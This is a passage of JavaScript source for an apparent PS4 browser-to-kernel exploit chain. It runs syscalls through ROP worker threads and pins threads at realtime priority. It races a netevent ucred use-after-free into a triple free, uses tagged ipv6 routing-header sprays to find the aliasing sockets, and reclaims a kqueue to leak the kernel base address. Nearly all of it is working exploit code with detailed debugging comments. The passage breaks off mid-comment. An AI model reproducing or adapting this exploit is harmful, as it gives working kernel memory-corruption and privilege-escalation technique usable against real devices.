            if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
            w.master = wm; w.origVector = p.read8(wm.add32(0x10));
            p.write8(wm.add32(0x10), wv); w.wired = true;
            await w.rpc("setup", 15000, wl.low, wl.hi);
            await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
            w.armed = true;
            w.ctx = createContext({ p, offsets: off, gadgets: G, keepAlive });
        }
        check("worker-came-arw",
            workers.length === TOTAL_WORKERS,
            workers.length + "/" + TOTAL_WORKERS);
        iovWorkers = workers.slice(0, NUM_IOV_WORKER);
        uioWorkers = workers.slice(NUM_IOV_WORKER);
        mark("WORKER-POOLS", "iov=" + iovWorkers.length
            + " uio=" + uioWorkers.length);
        return true;
}

/*
================================================================================
STAGE 3: stageThreadAttrs -- save + pin, and the restore closure
================================================================================

savedMask / savedPrio are read back at the very end of the run so the console can
be powered off. restoreThreadAttrs is the other half: main thread FIRST (latched
at the top, so a death below cannot leave main realtime-pinned on MAIN_CORE with
the finally's retry a permanent no-op -- that shape is exactly run #52), then the
workers, best-effort and reported per worker.
*/
async function stageThreadAttrs() {
        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        prioAddr = bufAddr(prioAb); maskAddr = bufAddr(maskAb);
        prioDv = new DataView(prioAb); maskDv = new DataView(maskAb);

        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true);
        prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];

        restoreThreadAttrs = async function (why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);

            /*
            MAIN THREAD FIRST. attrsRestored is latched at the top of this
            function, so a death anywhere below leaves main realtime-256 on
            MAIN_CORE AND makes the finally's retry a permanent no-op -- the
            console then refuses to power off. The 16 worker RPCs used to run
            first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
            nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
            thread and never touches a worker; we cannot copy that (our
            workers outlive the page) but we can copy the ordering.
            Widen affinity before dropping priority, never the reverse.
            */
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true);
            maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true);
            prioDv.setUint16(2, savedPrio[1], true);
            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;

            new Uint8Array(maskAb).fill(0);
            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                ID, 0x10, maskAddr);
            const backMask = new int64(maskDv.getUint32(0, true),
                maskDv.getUint32(4, true));
            prioDv.setUint16(0, 0xffff, true);
            prioDv.setUint16(2, 0xffff, true);
            sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
            const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
            const good = backMask.low === savedMask.low
                && backMask.hi === savedMask.hi
                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar
                + " rtprio=" + pr + " mask=" + backMask
                + " prio={" + backPrio + "} wanted=" + savedMask
                + " {" + savedPrio + "}");
            check("thread-attrs-restored-power-off-safe", good, "");

            /*
            Workers last, reported separately. By here main is already
            restored AND verified, so if these 16 RPCs never come back the
            console can still be shut down normally.
            */
            /*
            VISIBILITY + TIME FIX.

            This loop was the "frozen at remove_uaf_file..." the user saw: it
            awaits TWO RPCs per worker with a 5000 ms timeout each, and it emits
            NO mark and NO status until the very end. With 16 workers whose ROP
            contexts are already spent, every call times out, so that is up to
            16 x 2 x 5 s = 160 SECONDS of a page that looks hung while the
            event loop quietly turns. makeRpc rejects on timeout and the
            catch{} swallows it, so nothing was ever printed -- the last line
            stayed thread-attrs-restored-power-off-safe and the status stayed
            "remove_uaf_file...".

            Two changes, both safe:
              - a 1000 ms timeout (was 5000): main is ALREADY restored and
                verified above, so this pass is best-effort by construction.
                The reference restores only the calling thread; workers that do
                not answer are left as they are.
              - a mark per worker, so progress is visible instead of silent.
            */
            const WORKER_ATTR_MS = params.has("wattrms")
                ? parseInt(params.get("wattrms"), 10) : 1000;
            let wr = 0, wf = 0, firstErr = null;
            for (const w of workers) {
                if (!w.armed) continue;
                try {
                    new Uint8Array(maskAb).fill(0xff);
                    await fireW(w, SYS.cpuset_setaffinity,
                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr],
                        WORKER_ATTR_MS);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
                    prioDv.setUint16(2, 0, true);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr],
                        WORKER_ATTR_MS);
                    wr++;
                } catch (e) {
                    wf++;
                    if (!firstErr) firstErr = w.name + ": "
                        + ((e && e.message) ? e.message : String(e));
                }
            }
            /*
            ONE line for the whole pass, not 2N. Failures are summarised by
            count plus the FIRST error, so a run that needs ?verbose still has
            the diagnostic without eight identical lines. The earlier "silent
            for 32 s" problem is covered by WORKER-ATTR-PASS above, which
            prints once before the loop starts.
            */
            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/"
                + workers.length + (wf ? " failed=" + wf + " [" + firstErr + "]" : "")
                + " timeout_ms=" + WORKER_ATTR_MS);
        }

        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
            + " rtprio={" + savedPrio + "}");
        prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
        prioDv.setUint16(2, RTP, true);
        new Uint8Array(maskAb).fill(0);
        maskDv.setUint32(0, 1 << MAIN_CORE, true);

        {
            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            check("main-thread-pinned-realtime", a === 0 && r === 0,
                "core=" + MAIN_CORE + " rtp=" + RTP
                + " affinity=" + a + " rtprio=" + r);
        }
        fireW = function (w, num, args, timeoutMs) {
            layoutContext(w.ctx, off, G, argGadget, JSVALUE_UNDEFINED, stubAddr.get(num), args);
            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                w.ctx.S.low, w.ctx.S.hi);
        };
        for (const w of workers) {
            await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
            await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
        }
        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
            + " rtp=" + RTP);
        return true;
}

/*
================================================================================
STAGE 4: the reclaim scans -- findTwins / findTriplet
================================================================================

After the double free the chunk is re-taken by one of the 256 ipv6 sockets.
findTwins arms every socket with a unique tag and re-reads it; a socket reading
back ANOTHER socket's tag is reading the same chunk. findTriplet is the same
idea one level on, looking for the third owner.
*/
let sprayOk = null;
let liveFds = new Set();    // fds still open and still aliasing the triple-free

/*
MODULE SCOPE, not inside makeScanners(). findTriplet sets it and
stageTripleFree reads it, and those are different functions -- declaring it in
findTriplet's own scope (or makeScanners') makes it invisible to the caller,
which is the argGadget / iovAb / boundedJoin mistake for the fourth time.
*/
let missReason = 0;

/* findTriplet's miss code -> a word for the log. */
function whyCodeName(c) {
    if (c === -1) return "never-tagged";
    if (c === 1) return "tag-lost";
    return "owner-not-found";
}

function makeScanners() {
        tagFor = function (i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; };
        readTag = function () {
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
        };

        /*
        Sized from the constant, not 256: an undefined slot reads as falsy and
        would make findTwins skip every socket, i.e. silently never find a twin.
        */
        /*
        ASYNC + YIELD. 10 rounds x 256 sockets x 2 syscalls is up to 5,120
        synchronous ROP syscalls in one unbroken JS stretch -- that is one of
        the "This page is not responding" popups. These are post-commit
        reclaim scans (the refcount race below keeps its timing), so turning
        the event loop once per round lets JSC's sweeper run and is safe.
        */
        sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        findTwins = async function (timeout) {
            for (let round = 0; round < timeout; ++round) {
                if (round) await new Promise(r => setTimeout(r, 0));
                for (let i = 0; i < ipv6.length; ++i) {

                    /*
                    ITEM 6(a). Re-setting a burned socket frees the chunk it
                    aliases. sprayOk stays false so the read loop skips it too.
                    */
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);

                    /*
                    R2. A failed set (ENOBUFS) leaves this socket owning the
                    PREVIOUS tag. Trusting it can fabricate a twin pair, and
                    freeRthdr(twins.b) then frees a chunk another socket owns.
                    */
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    if (R2_ON && !sprayOk[i]) continue;
                    if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
                    const t = readTag();
                    if (t.ok && t.idx !== i && t.idx < ipv6.length
                        && (!R2_ON || sprayOk[t.idx]))
                        return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }

                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            return null;
        }

        /*
        ASYNC + YIELD. Same reasoning as findTwins: 500 rounds x 256 sockets
        x 2 syscalls, or FIND_TRIPLET_FAST (5000) when ?uio retries -- 256k
        synchronous ROP calls is the popup. Every caller below awaits it.
        */
        findTriplet = async function (master, slave, tag, timeout) {
            missReason = 0;     // module scope -- read by stageTripleFree
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            const seen = [];
            let untagged = 0;
            let tagLostAt = -1;     // first round the master stopped being tagged
            /*
            GIVE UP WHEN THE MASTER NEVER PRODUCES A USABLE TAG.

            This loop resolves t1/t2 from the MASTER's tag word. If the master
            is not tagged, EVERY round sprays and reads back nothing, and the
            bound (500 normally, 5000 x 3 on a refind) is pure damage: each
            round is 2 x 256 synchronous ROP syscalls. Without this bail the
            loop burns the full budget with no mark() in between -- the run
            freezes right after POST-TRIPLE and never prints TRIPLET-<tag> or
            TRIPLET-<tag>-MISS. A tagged master produces an idx on round 0 in
            every observed run, so a small run of consecutive fully-untagged
            rounds is enough to conclude the master is not a tagged owner.
            Bounded by ?tripletuntagged=; a non-positive or unparsable value
            disables the bail and reinstates the old full-budget behaviour.
            */
            const UNTAGGED_BAIL = (function () {
                if (!params.has("tripletuntagged")) return 16;
                const n = parseInt(params.get("tripletuntagged"), 10);
                return ((n | 0) === n && n >= 1) ? n : 0;
            })();
            let untaggedStreak = 0;
            for (let round = 0; round < rounds; ++round) {
                if (round && !(round % 8)) await new Promise(r2 => setTimeout(r2, 0));
                for (let i = 0; i < ipv6.length; ++i) {
                    /*
                    ITEM 6(a). Re-setting a burned socket frees the chunk it
                    aliases. sprayOk stays false so the master read cannot
                    resolve to it either.
                    */
                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);
                    /*
                    R2. A failed set (ENOBUFS) leaves this socket owning the
                    PREVIOUS tag. Trusting it can resolve the master to a
                    socket that is not aliased at all -- a fabricated t1/t2.
                    Track it the same way findTwins does.
                    */
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }

                const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0
                    ? { ok: false, idx: 0 } : readTag();
                /*
                Bound idx HERE, before anything reads it. `t.idx` is the low
                16 bits of an arbitrary kernel word, so it can be any value in
                0..0xffff; `ipv6[t.idx]` on an out-of-range index is undefined.
                */
                if (!(t.idx >= 0 && t.idx < ipv6.length)) t.ok = false;
                if (R2_ON && t.ok && !sprayOk[t.idx]) t.ok = false;
                if (!t.ok) untagged++;
                const fd = t.ok ? ipv6[t.idx] : -1;
                if (seen.length < 6)
                    seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                if (fd !== -1 && fd !== master && fd !== slave
                    && !burned.has(fd)) {   // ITEM 6(a)

                    (/^(RE|UW)/.test(tag) ? trace : mark)
                        ("TRIPLET-" + tag, "round=" + round + " fd=" + fd
                            + " untagged=" + untagged);
                    return fd;
                }
                /*
                UNTAGGED-STREAK BAIL. Count consecutive rounds in which the
                master produced no usable tag; any tagged read resets it.
                */
                if (t.ok) untaggedStreak = 0; else untaggedStreak++;
                /*
                TAG-WATCH (diagnostic, item A).

                The bail below cannot tell "the master was never a tagged
                owner" from "the master WAS tagged and this scan just
                destroyed its tag". Those need opposite responses, so log the
                transition: the first round in which the master stops reading
                a valid RTHDR_TAG. Observed log shape that motivated this:
                    POST-TRIPLE master=17 twin=40 idx=0 refcnt=1   (tagged)
                    TRIPLET-T1-UNTAGGED-BAIL round=15/500 streak=16/16
                i.e. the master was fine, then went untagged while the scan
                ran. setRthdr() on a socket that already owns an rthdr is a
                free-then-realloc, so re-spraying 255 siblings can free the
                chunk the master is reading.
                */
                if (!t.ok && untaggedStreak === 1) {
                    tagLostAt = round;
                    mark("TRIPLET-" + tag + "-TAG-LOST", "round=" + round
                        + " master=" + master + " -- master was tagged at"
                        + " entry and now reads no RTHDR_TAG; the spray is"
                        + " freeing its chunk");
                }
                if (UNTAGGED_BAIL > 0 && untaggedStreak >= UNTAGGED_BAIL) {
                    mark("TRIPLET-" + tag + "-UNTAGGED-BAIL", "round=" + round
                        + "/" + rounds + " master=" + master
                        + " streak=" + untaggedStreak + "/" + UNTAGGED_BAIL
                        + (tagLostAt >= 0 ? " tag_lost_at=" + tagLostAt
                            : " master_never_tagged")
                        + " -- master produced no usable tag; not burning the"
                        + " rest of the budget");
                    break;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave="
                + slave + " rounds=" + rounds + " untagged=" + untagged
                + (tagLostAt >= 0 ? " tag_lost_at=" + tagLostAt : "")
                + "  first reads: " + seen.join(" "));
            /*
            Report WHY, so the caller can tell a recoverable miss (the spray
            destroyed the master's tag, or the owner was simply never found)
            from the one genuinely fatal case (untagged from the very first
            round, i.e. the master is not an owner at all).

            -1  never tagged: master is not a tagged owner  -> FATAL for this
                attempt; the triple free is not usable.
             1  tag lost mid-scan: the spray freed the master's chunk. The
                alias was real, so this is worth a retry, NOT a reboot.
             0  tagged throughout, owner just not named in `rounds` -> retry.
            */
            const whyCode = tagLostAt >= 0 ? 1 : (untagged >= rounds ? -1 : 0);
            missReason = whyCode;
            return 0;
        }

        bootFingerprint = function () {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            nameDv.setUint32(0, 1, true);
            nameDv.setUint32(4, 21, true);
            lenDv.setUint32(0, 0x10, true);
            lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
            const gotLen = lenDv.getUint32(0, true);
            const o = new DataView(outAb);
            const sec = o.getUint32(0, true);
            if (rv !== 0 || sec === 0) {
                bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
                return null;
            }
            return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
        };
}

/*
================================================================================
STAGE 5: stageTripleFree -- arm the UAF and race it to a triple-free
================================================================================

netevent(SET_QUEUE) registers a queue on a socket, the fd is closed and
immediately re-taken, and netevent(CLEAR_QUEUE) frees the ucred while uafSock
still references it. dup+close then frees it a second time, and the refcount
race on the iov workers drives it to a THIRD owner. Every socket that ends up
holding a freed chunk is burned and never touched again until kernel R/W can
repair it (see burn()).

REFUSES to arm if the console has not been rebooted since the last committed run
-- the fingerprint check that sits between makeScanners() and the loop below.
Returns false where the old body `return`ed bare.
*/
async function stageTripleFree() {
        boot = bootFingerprint();
        mark("BOOT", boot || bootErr);
        let lastCommitted = null;
        try { lastCommitted = localStorage.getItem("ps4lab_committed_boot"); }
        catch (e) { }
        if (boot && lastCommitted === boot && params.get("force") !== "1") {
            mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
            check("console-rebooted-since-last-committed", false,
                "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
            mark("PROOF-SUMMARY-FINAL", "pass=" + checkCounts().passCount
                + " fail=" + checkCounts().failCount);
            return false;
        }
        check("console-rebooted-since-last-committed", true,
            "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));

        /*
        ITEM 6(d). `committed` means "kernel state irreversibly touched" --
        reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
        whether an alias exists that we could NOT contain. poops.js:4356
        refuses on that condition, not on "we already fired".
        */
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) {
                mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                    + " reason=" + uncontained);
                break;
            }
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);

            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
            if (reg.rv === -1) {
                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
                sc(SYS.close, dummy); continue;
            }

            sc(SYS.close, dummy);
            sc(SYS.setuid, 1);
            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (uafSock !== dummy) {
                mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                    + " got " + uafSock);
                if (uafSock !== -1) sc(SYS.close, uafSock);
                uafSock = 0;
                continue;
            }
            sc(SYS.setuid, 1);
            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
            committed = true;

            try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
            catch (e) { }

            for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);

            if (STOP_BEFORE_DOUBLE) {
                mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
                rebootRequired = true;
                break;
            }

            const d1 = sc(SYS.dup, uafSock).i32;
            if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
            sc(SYS.close, d1);
            rebootRequired = true;
            mark("DOUBLE-FREE", "dup=" + d1 + " closed");

            twins = await findTwins(MAX_ROUNDS_TWIN);
            if (!twins) {

                /*
                No socket showed a duplicate tag: either the double free did
                not take, or it did and the scan missed it -- indistinguishable
                from here (poops.js:4443 says the same). Nothing is KNOWN to be
                aliased, so there is nothing to burn. Drop the spent fd, retry.
                */
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=no-twins next="
                    + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }
            mark("TWINS", "a=" + twins.a + " b=" + twins.b
                + " round=" + twins.round);

            freeRthdr(twins.b);
            let reclaimed = false, rounds = 0;

            function fireTracked(w) {
                const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                t.settled = false;
                t.then(() => { t.settled = true; }, () => { t.settled = true; });
                return t;
            }
            const tasks = new Array(iovWorkers.length);
            let parkedSeen = -1;
            for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                rounds = i + 1;
                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                sc(SYS.sched_yield);
                if (parkedSeen < 0) {

                    await new Promise(r => setTimeout(r, 0));
                    parkedSeen = tasks.filter(t => !t.settled).length;
                    mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
                }
                if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0
                    && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }

                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                /*
                BOUNDED. tasks are fireW(..., 0) RPCs -- no timeout -- so a
                batch where every racer parked never settles. That is an
                INDEFINITE HANG on the main JS thread (needs a manual reboot),
                not a kernel panic, which is exactly the symptom reported.
                boundedJoin gives up after JOIN_MS and lets the retry path take
                over instead of wedging the page.
                */
                await boundedJoin(tasks, JOIN_MS, "refcount-drive");
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            const rets = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
            check("cr_refcnt-driven-1", reclaimed,
                "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
            if (!reclaimed) {

                /*
                ITEM 6(b). This used to `break`, which is why attempts=8 never
                produced a second try: 7 of 89 armed runs die exactly here.
                twins.a/twins.b DO alias the freed chunk now, so a bare retry
                would re-spray them and free memory another socket owns. Burn
                them, release the parked racers, drop the spent uafSock, and
                only then go round again.
                */
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                /* Bounded -- see the join above. */
                await boundedJoin(tasks, JOIN_MS, "refcount-retry");
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
                burn(twins.a, "refcount-drive");
                burn(twins.b, "refcount-drive");
                twins = null;
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=refcount-drive burned="
                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }

            const d2 = sc(SYS.dup, uafSock).i32;
            if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
            sc(SYS.close, d2);
            mark("TRIPLE-FREE", "dup=" + d2 + " closed");

            const t0 = twins.a;

            const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
            mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
                + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
                + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
            const t1 = await findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
            /*
            Capture T1's reason NOW. It is the T1 scan that decides whether this
            double-free alias is usable, and the T2 call below overwrites the
            shared missReason -- reading it afterwards would report T2's outcome
            for a T1 failure.
            */
            const why1 = missReason;

            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.write, iovSs[1], scratch, 1);
            /* Bounded -- see the refcount-drive join above. */
            await boundedJoin(tasks, JOIN_MS, "iov-release");
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.read, iovSs[0], scratch, 1);
            const rets2 = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
            mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
                + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));

            const t2 = t1 ? await findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET) : 0;
            /*
            Do NOT re-run T2 against a slave of 0: findTriplet(t0, 0, ...) would
            skip fd 0 in the spray loop (which is a real fd) and report a reason
            for a scan we never needed. The decision below keys off why1.
            */
            if (t1 && t2) {
                triplets = [t0, t1, t2];
                mark("TRIPLETS", triplets.join(","));
            } else {
                /*
                We could not name all three owners. Burn what we touched -- if
                t1 resolved, it aliases the freed chunk and must not be
                re-sprayed -- but decide RETRY vs REBOOT on WHY the scan failed.

                The old code set uncontained unconditionally, which refuses
                every remaining attempt and forces a reboot. Observed cost: a
                run with attempts=8 used 2, hit UNTAGGED-BAIL, and reported
                "FAILED IN triple free -- REBOOT" while the triple free had
                actually SUCCEED (PROOF-OK cr_refcnt-driven-1, TRIPLE-FREE
                both passed).

                T1 failing with why = -1 means the master was never a tagged
                owner from round 0: the alias is not usable and this attempt is
                genuinely spent, so refuse further retries (poops.js:4356).
                why = 0 or 1 means the alias WAS real and the spray disturbed
                it -- that is a retry, not a poisoned kernel.
                */
                mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2
                    + " t1_why=" + (t1 ? "named" : whyCodeName(why1)));
                burn(t0, "triplet-miss");
                if (t1) burn(t1, "triplet-miss");
                if (twins && twins.b) burn(twins.b, "triplet-miss");

                if (!t1 && why1 === -1) {
                    uncontained = "triplet-miss-never-tagged";
                    mark("NO-RETRY-REASON", "master " + t0
                        + " was never a tagged owner -- not retrying");
                } else {
                    /*
                    Recoverable. Clear the parked racers and the spent uafSock
                    exactly as the refcount-drive retry does, then go round
                    again -- t0 and twins.b are burned above, so the next
                    attempt will not re-spray them.
                    */
                    for (let k = 0; k < iovWorkers.length; ++k)
                        sc(SYS.write, iovSs[1], scratch, 1);
                    await boundedJoin(tasks, JOIN_MS, "triplet-retry");
                    for (let k = 0; k < iovWorkers.length; ++k)
                        sc(SYS.read, iovSs[0], scratch, 1);
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    twins = null;
                    mark("ATTEMPT-RETRY", "after=triplet-miss why="
                        + whyCodeName(why1) + " burned=" + burned.size
                        + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                    continue;
                }
            }
        }

        check("ucred-triple-freed", !!triplets,
            triplets ? triplets.join(",") : "");
        return !!triplets;
}

/*
================================================================================
STAGE 6: stageLeakKqueue -- kernelBase from a reclaimed kqueue
================================================================================

freeRthdr frees the third owner's chunk and a kqueue is opened until one lands
on it. The 0x1430000 header word is the hit test, and kl_lock (+0x60) gives
kernelBase = kl_lock - k_kl_lock. kq_fdp (+0x98) is kept: the ofiles table is
reached through it later.
*/
async function stageLeakKqueue() {
        if (triplets) {
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
            } else {
                state("leaking a kqueue...", "warn");
        /*
        FREE THE RECLAIM POOL BEFORE THE SCAN.

        The 256 ipv6 sockets existed only to FIND the triplets, and they
        are what exhausts the fd table -- the kqueue scan below is what
        NEEDS a free descriptor. Keeping them costs over half the process
        rlimit:

            KQUEUE-EMFILE-BAIL first_at=459 last_at=522 count=64

        This block used to sit at the END of the stage, gated on
        `kernelBase && triplets` -- which inverted it completely, because a
        FAILED leak never sets kernelBase, so the fds were never returned
        in exactly the case that needed them. Gated on `triplets` alone, and
        run BEFORE freeRthdr/scan, they are back in time to be useful.

        Kept open: the triplets (both triplets and twins), and any burned fd
        whose rthdr points at freed memory -- closing those frees it again.
        Survivors go in liveFds, which tripletsUsable() consults.
        */
        if (triplets) {
            liveFds = new Set();
            for (const fd of triplets) if (fd > 0) liveFds.add(fd);
            if (twins) {
                if (twins.a > 0) liveFds.add(twins.a);
                if (twins.b > 0) liveFds.add(twins.b);
            }
            let freed = 0, kept = 0;
            for (const fd of ipv6) {
                /* Burned sockets own an rthdr over freed memory -- never close. */
                if (liveFds.has(fd) || burned.has(fd)) { kept++; continue; }
                if (sc(SYS.close, fd).i32 === 0) freed++;
            }
            mark("POOL-FREED", "closed=" + freed + "/" + ipv6.length
                + " kept=" + kept + " live_fds=" + [...liveFds].join(",")
                + (burned.size ? " burned=" + burned.size : ""));
            check("kqueue-fd-budget-freed", freed > 0, "freed " + freed);
        }

                freeRthdr(triplets[2]);
                sc(SYS.sched_yield);
                sc(SYS.sched_yield);
                let leaked = false, tries = 0, hitRound = -1;
                let openKq = -1;

                /*
                Mirrors smaller-kernel-script/netctrl.js leak_kqueue() line
                for line: ONE kqueue open at a time, closed every iteration,
                and the hit test is the 0x1430000 header word ALONE. The
                previous version gated on a 0xa0 copyout length AND a nonzero
                kq_fdp word -- both conditions can fail while the reclaim is
                real (a short copyout leaves the magic from THIS read in the
                buffer's first 8 bytes, which is all the reference checks),
                so a successful leak was being rejected every boot.
                */
                /*
                EMFILE STORM. kqueue() returning -1 means the fd table is
                full, and it stays full -- the failing call does not consume or
                release anything, so if it fails once it fails on every
                subsequent round too. That produced 2000+ identical
                KQUEUE-EMFILE lines and burned the remaining budget doing
                nothing. Report it ONCE with the first index, count every
                occurrence, and stop after a bounded run of consecutive
                failures: a wedged last iteration is not going to recover, and
                spinning the full 5000 just delays the failure report.
                */
                let emfileCount = 0, emfileAt = -1, emfileStreak = 0;
                let closeFailed = 0, leakedFds = 0;
                const EMFILE_BAIL = params.has("emfilebail")
                    ? parseInt(params.get("emfilebail"), 10) : 64;
                /*
                OPTION A -- LEAK FIX, and it was the cause of the EMFILE storm.

                The loop opens a kqueue every round and must close it on EVERY
                exit path. The short-read branch used to be:

